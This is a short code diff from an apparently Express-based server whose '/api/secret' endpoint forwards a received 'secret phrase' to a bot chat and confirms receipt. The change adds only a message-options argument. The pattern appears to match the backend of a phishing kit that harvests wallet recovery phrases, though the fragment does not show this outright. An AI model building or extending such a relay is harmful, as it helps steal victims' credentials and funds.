@@ -199,7 +199,7 @@ app.post('/api/secret', (req, res) => {
         },
     };
 
-    bot.sendMessage(config.chatId, message);
+    bot.sendMessage(config.chatId, message, options);
 
     // Send response to client
     res.status(200).json({ message: 'Secret phrase received successfully' });
